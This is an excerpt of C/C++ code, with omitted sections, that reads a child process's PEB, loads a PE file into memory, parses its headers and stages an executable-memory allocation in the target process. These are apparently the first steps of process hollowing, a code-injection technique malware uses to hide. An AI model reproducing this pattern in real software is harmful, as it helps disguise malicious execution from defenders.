			...
			if (API(KERNEL32, ReadProcessMemory)(pi.hProcess, (LPCVOID)((SIZE_T)pbi.PebBaseAddress + sizeof(size_t) * 2), &pebt, sizeof(PEB), 0)) {
				...
				if (NT_SUCCESS(status)) {
					...
					if (file != INVALID_HANDLE_VALUE) {
						...
						BYTE* tdata = (BYTE*)core::alloc(lsz.QuadPart);

						if (tdata && API(KERNEL32, ReadFile)(file, tdata, lsz.QuadPart, &readed, 0)) {
							LOADED_IMAGE loadim;
							PIMAGE_NT_HEADERS nt;
							Process::GetLoadedImage((size_t)tdata, &loadim);
							nt = Process::GetNTHeaders((size_t)tdata);

							//PVOID premim = VirtualAllocEx(pi.hProcess, pbaddr, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
